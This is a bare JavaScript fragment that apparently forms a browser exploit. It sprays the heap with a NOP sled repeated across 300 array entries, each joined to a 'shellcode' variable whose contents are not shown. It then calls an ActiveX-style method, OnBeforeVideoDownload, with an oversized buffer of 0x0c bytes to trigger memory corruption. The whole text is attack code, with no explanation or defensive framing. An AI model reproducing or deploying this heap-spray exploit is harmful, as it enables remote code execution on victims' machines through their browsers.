var bigblock=unescape("%"+"u"+"9"+"0"+"9"+"0"+"%"+"u"+"9"+"0"+"9"+"0");
var headersize=20;
var slackspace=headersize+shellcode.length;
while(bigblock.length<slackspace)
bigblock+=bigblock;
fillblock=bigblock.substring(0,slackspace);
block=bigblock.substring(0,bigblock.length-slackspace);
while(block.length+slackspace<0x40000)
block=block+block+fillblock;
memory=new Array();
for(x=0;x<300;x++)
memory[x]=block+shellcode;
var buffer='';
while(buffer.length<4150)
buffer+="\x0c"+"\x0c"+"\x0c"+"\x0c";
target.OnBeforeVideoDownload(buffer);